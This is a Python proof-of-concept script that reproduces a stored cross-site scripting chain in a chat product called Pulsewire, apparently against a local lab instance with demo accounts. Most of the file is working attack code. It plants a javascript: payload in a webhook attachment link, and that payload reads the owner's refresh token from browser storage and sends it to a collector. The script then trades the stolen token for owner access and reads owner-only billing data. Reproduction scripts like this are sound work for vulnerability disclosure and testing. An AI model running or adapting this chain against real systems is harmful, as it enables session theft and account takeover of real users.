#!/usr/bin/env python3
"""Reproduce Pulsewire's stored attachment-link XSS and owner takeover chain."""

from __future__ import annotations

import argparse
import base64
import json
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any


MEMBER_EMAIL = "maya@northstar.test"
MEMBER_PASSWORD = "member-demo-2026"
OWNER_EMAIL = "olivia@northstar.test"
WORKSPACE_ID = "ws_northstar_01"
CHANNEL_ID = "ch_general"


@dataclass(frozen=True)
class HttpResult:
    """Normalized response from the lab API."""

    status: int
    body: Any


def request(
    base_url: str,
    method: str,
    path: str,
    *,
    token: str | None = None,
    json_body: Any | None = None,
) -> HttpResult:
    """Send an HTTP request without following redirects or using cookies."""

    url = urllib.parse.urljoin(f"{base_url.rstrip('/')}/", path.lstrip("/"))
    data = None
    headers = {"Accept": "application/json"}
    if token:
        headers["AuthToken"] = token
    if json_body is not None:
        data = json.dumps(json_body, separators=(",", ":")).encode("utf-8")
        headers["Content-Type"] = "application/json"

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            raw = response.read()
            status = response.status
            content_type = response.headers.get("Content-Type", "")
    except urllib.error.HTTPError as error:
        raw = error.read()
        status = error.code
        content_type = error.headers.get("Content-Type", "")
    except urllib.error.URLError as error:
        raise RuntimeError(f"Cannot reach {url}: {error.reason}") from error

    if "application/json" in content_type:
        body: Any = json.loads(raw or b"{}")
    else:
        body = raw.decode("utf-8", errors="replace")
    return HttpResult(status=status, body=body)


def expect(result: HttpResult, status: int, label: str) -> Any:
    """Require an expected status and return its response body."""

    if result.status != status:
        raise RuntimeError(
            f"{label}: expected HTTP {status}, received {result.status}: {result.body}"
        )
    return result.body


def decode_claims(token: str) -> dict[str, Any]:
    """Decode a lab JWT payload without treating it as signature verification."""

    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload.encode("ascii")))
    except (IndexError, ValueError, json.JSONDecodeError) as error:
        raise RuntimeError("Captured value is not a decodable lab token.") from error


def build_payload() -> str:
    """Build the meeting-suffix payload consumed by the vulnerable renderer."""

    return (
        "javascript:(function(){"
        "var k=Object.keys(localStorage).filter(function(s){return s.indexOf('pulsewire_session_')===0})[0];"
        "var r=JSON.parse(localStorage.getItem(k)).refreshToken;"
        "var z=Math.ceil(r.length/4);"
        "for(var i=0;i<4;i++){fetch('/collector/p'+i+'/'+encodeURIComponent(r.slice(i*z,(i+1)*z)))}"
        "})()//https://meet.pulsewire.test/abc-defg-hij"
    )


def main() -> int:
    """Run the full five-request chain around the required victim click."""

    parser = argparse.ArgumentParser(
        description="Reproduce the Pulsewire stored-XSS-to-owner-takeover chain."
    )
    parser.add_argument("--base-url", default="http://127.0.0.1:5090")
    parser.add_argument("--wait-seconds", type=int, default=180)
    parser.add_argument("--out", type=Path, default=Path("evidence.json"))
    args = parser.parse_args()
    if args.wait_seconds < 1 or args.wait_seconds > 1800:
        parser.error("--wait-seconds must be between 1 and 1800")

    base_url = args.base_url.rstrip("/")
    evidence: dict[str, Any] = {"baseUrl": base_url, "checks": []}

    print("[1/5] Sign in as the ordinary workspace member")
    login = expect(
        request(
            base_url,
            "POST",
            "/api/auth/login",
            json_body={"email": MEMBER_EMAIL, "password": MEMBER_PASSWORD},
        ),
        200,
        "member login",
    )
    member_token = login["accessToken"]
    member_claims = decode_claims(member_token)
    print(f"      role={member_claims['role']} subject={member_claims['sub']}")

    denied_install = request(
        base_url, "POST", "/api/apps/install", token=member_token, json_body={"app": "calendar"}
    )
    expect(denied_install, 403, "member application install control")
    evidence["checks"].append({"name": "member-app-install", "status": 403})

    print("[2/5] Create a first-party incoming webhook and plant the attachment")
    hook = expect(
        request(
            base_url,
            "POST",
            f"/api/workspaces/{WORKSPACE_ID}/incoming-webhooks",
            token=member_token,
            json_body={"name": "Standup Assistant", "channelId": CHANNEL_ID},
        ),
        201,
        "member webhook creation",
    )
    expect(request(base_url, "DELETE", "/collector/capture"), 204, "collector reset")

    payload = build_payload()
    message_body = {
        "text": (
            f"Standup call is starting. <{payload}|join the meeting> "
            "and <https://meet.pulsewire.test/abc-defg-hij|the real link>"
        ),
        "attachments": [
            {
                "title": "STANDUP · JOIN CALL",
                "title_link": payload,
                "text": "Daily product standup · Hosted by Standup Assistant",
            }
        ],
        "blocks": [
            {
                "type": "actions",
                "elements": [
                    {"type": "button", "text": "Unsafe control", "url": payload},
                    {
                        "type": "button",
                        "text": "Safe control",
                        "url": "https://example.test/standup",
                    },
                ],
            }
        ],
    }
    planted = request(base_url, "POST", hook["postPath"], json_body=message_body)
    expect(planted, 200, "webhook message")
    if planted.body != "ok":
        raise RuntimeError(f"webhook message: expected the two-byte body 'ok', got {planted.body!r}")
    print("      HTTP 200 body=ok; unsafe title_link accepted")

    messages = expect(
        request(base_url, "GET", f"/api/channels/{CHANNEL_ID}/messages", token=member_token),
        200,
        "message readback",
    )["messages"]
    stored = messages[-1]
    stored_link = stored["attachments"][0]["title_link"]
    unsafe_button = stored["blocks"][0]["elements"][0]
    safe_button = stored["blocks"][0]["elements"][1]
    if stored_link != payload or "url" in unsafe_button or safe_button.get("url") != "https://example.test/standup":
        raise RuntimeError("The storage differential did not match the vulnerable contract.")
    evidence["checks"].append(
        {
            "name": "scheme-filter-differential",
            "attachmentStoredVerbatim": True,
            "unsafeButtonUrlRemoved": True,
            "safeButtonUrlStored": True,
        }
    )
    print("      attachment URL persisted; identical button URL stripped")

    print("[3/5] Victim interaction required")
    print(f"      Open {base_url} in a separate browser profile")
    print(f"      Sign in as {OWNER_EMAIL} / owner-demo-2026")
    print("      Open #general and click the blue STANDUP · JOIN CALL card once")
    print(f"      Waiting up to {args.wait_seconds} seconds for four collector chunks…")

    deadline = time.monotonic() + args.wait_seconds
    capture: dict[str, Any] | None = None
    while time.monotonic() < deadline:
        candidate = expect(
            request(base_url, "GET", "/collector/capture"), 200, "collector poll"
        )
        if candidate.get("ready"):
            capture = candidate
            break
        print(f"      received={candidate.get('receivedParts', [])}", end="\r", flush=True)
        time.sleep(1)
    print(" " * 55, end="\r")
    if not capture:
        raise RuntimeError("No complete capture arrived before the timeout.")

    stolen_refresh = capture["assembled"]
    stolen_claims = decode_claims(stolen_refresh)
    print(
        f"      captured {capture['length']} bytes: "
        f"role={stolen_claims.get('role')} type={stolen_claims.get('type')}"
    )
    if stolen_claims.get("role") != "OWNER" or stolen_claims.get("type") != "refresh":
        raise RuntimeError("The captured credential is not the owner's refresh token.")
    evidence["checks"].append(
        {
            "name": "victim-browser-exfiltration",
            "parts": capture["receivedParts"],
            "length": capture["length"],
            "claims": {
                key: stolen_claims.get(key)
                for key in ("sub", "email", "role", "type", "workspace", "exp")
            },
        }
    )

    print("[4/5] Exchange the stolen refresh token with no other credential")
    refreshed = expect(
        request(
            base_url,
            "POST",
            f"/api/workspaces/{WORKSPACE_ID}/refresh",
            json_body={"refreshToken": stolen_refresh},
        ),
        200,
        "owner token refresh",
    )
    owner_token = refreshed["accessToken"]
    owner_claims = decode_claims(owner_token)
    print(f"      minted role={owner_claims['role']} access token for {owner_claims['email']}")

    print("[5/5] Compare the same owner-only endpoint with both principals")
    member_billing = request(
        base_url,
        "GET",
        f"/api/workspaces/{WORKSPACE_ID}/payments/customer",
        token=member_token,
    )
    owner_billing = request(
        base_url,
        "GET",
        f"/api/workspaces/{WORKSPACE_ID}/payments/customer",
        token=owner_token,
    )
    expect(member_billing, 403, "member billing control")
    billing = expect(owner_billing, 200, "stolen owner billing access")
    print("      member token: HTTP 403")
    print(f"      stolen owner session: HTTP 200 plan={billing['basicInfo']['plan']}")
    evidence["checks"].append(
        {"name": "privilege-differential", "memberStatus": 403, "stolenOwnerStatus": 200}
    )

    args.out.write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    print(f"\nReproduction complete. Sanitized evidence written to {args.out}")
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (RuntimeError, KeyError) as error:
        print(f"\nERROR: {error}", file=sys.stderr)
        raise SystemExit(1) from error
